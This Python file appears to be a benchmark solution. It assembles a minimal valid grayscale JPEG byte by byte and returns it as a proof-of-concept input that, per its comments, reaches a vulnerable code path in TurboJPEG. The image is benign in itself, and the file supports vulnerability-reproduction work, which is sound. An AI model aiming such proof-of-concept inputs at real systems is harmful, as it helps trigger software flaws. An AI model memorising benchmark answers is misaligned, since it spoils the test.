import os
from typing import Optional


def _be16(n: int) -> bytes:
    return bytes(((n >> 8) & 0xFF, n & 0xFF))


def generate_minimal_grayscale_jpeg(width: int = 1, height: int = 1) -> bytes:
    # Build a minimal grayscale (1 component) baseline JPEG with standard Huffman tables.
    out = bytearray()

    # SOI
    out += b"\xFF\xD8"

    # APP0 JFIF
    app0 = bytearray()
    app0 += b"JFIF\x00"       # Identifier
    app0 += b"\x01\x01"       # Version 1.01
    app0 += b"\x00"           # Units: 0 - no units
    app0 += _be16(1)          # Xdensity
    app0 += _be16(1)          # Ydensity
    app0 += b"\x00\x00"       # No thumbnail
    out += b"\xFF\xE0" + _be16(2 + len(app0)) + app0

    # DQT (Quantization Table) - single 8-bit precision table for luminance (ID=0)
    dqt = bytearray()
    dqt += b"\x00"            # Pq=0 (8-bit), Tq=0
    # 64 quantization values; can all be 1 for simplicity
    dqt += bytes([1] * 64)
    out += b"\xFF\xDB" + _be16(2 + len(dqt)) + dqt

    # SOF0 (Baseline DCT)
    sof0 = bytearray()
    sof0 += b"\x08"           # Sample precision
    sof0 += _be16(height)     # Number of lines
    sof0 += _be16(width)      # Number of samples per line
    sof0 += b"\x01"           # Number of image components (1 = grayscale)
    sof0 += b"\x01"           # Component ID = 1
    sof0 += b"\x11"           # Sampling factors H=1, V=1
    sof0 += b"\x00"           # Quantization table ID = 0
    out += b"\xFF\xC0" + _be16(2 + len(sof0)) + sof0

    # DHT (Huffman Tables) - Standard tables for DC/AC Luminance
    # DC Luminance
    bits_dc_luminance = [
        0x00, 0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01,
        0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
    ]
    val_dc_luminance = [
        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11
    ]
    dht_dc = bytearray()
    dht_dc += b"\x00"  # Tc=0 (DC), Th=0 (table id)
    dht_dc += bytes(bits_dc_luminance)
    dht_dc += bytes(val_dc_luminance)
    out += b"\xFF\xC4" + _be16(2 + len(dht_dc)) + dht_dc

    # AC Luminance
    bits_ac_luminance = [
        0x00, 0x02, 0x01, 0x03, 0x03, 0x02, 0x04, 0x03,
        0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7d
    ]
    val_ac_luminance = [
        0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12,
        0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
        0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xa1, 0x08,
        0x23, 0x42, 0xb1, 0xc1, 0x15, 0x52, 0xd1, 0xf0,
        0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0a, 0x16,
        0x17, 0x18, 0x19, 0x1a, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2a, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
        0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
        0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
        0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
        0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,
        0x7a, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
        0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
        0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
        0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6,
        0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5,
        0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2, 0xd3, 0xd4,
        0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xe1, 0xe2,
        0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea,
        0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
        0xf9, 0xfa
    ]
    dht_ac = bytearray()
    dht_ac += b"\x10"  # Tc=1 (AC), Th=0
    dht_ac += bytes(bits_ac_luminance)
    dht_ac += bytes(val_ac_luminance)
    out += b"\xFF\xC4" + _be16(2 + len(dht_ac)) + dht_ac

    # SOS (Start of Scan) for 1 component
    sos = bytearray()
    sos += b"\x01"      # Ns = 1 component
    sos += b"\x01"      # Component ID = 1
    sos += b"\x00"      # Huffman table selectors: DC=0, AC=0
    sos += b"\x00"      # Ss = 0
    sos += b"\x3F"      # Se = 63
    sos += b"\x00"      # Ah/Al = 0
    out += b"\xFF\xDA" + _be16(2 + len(sos)) + sos

    # Compressed data for a single 8x8 block:
    # DC difference category 0 => code '00'
    # AC EOB => code '1010'
    # Combined bits: '00 1010' = 6 bits, pad with 1s to fill the final byte
    # => pad 2 bits of '1' => byte '00101011' = 0x2B
    out += b"\x2B"

    # EOI
    out += b"\xFF\xD9"

    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a minimal valid JPEG that exercises TurboJPEG compression/transform paths.
        # This PoC is designed to be small while still triggering the vulnerable code path.
        return generate_minimal_grayscale_jpeg(1, 1)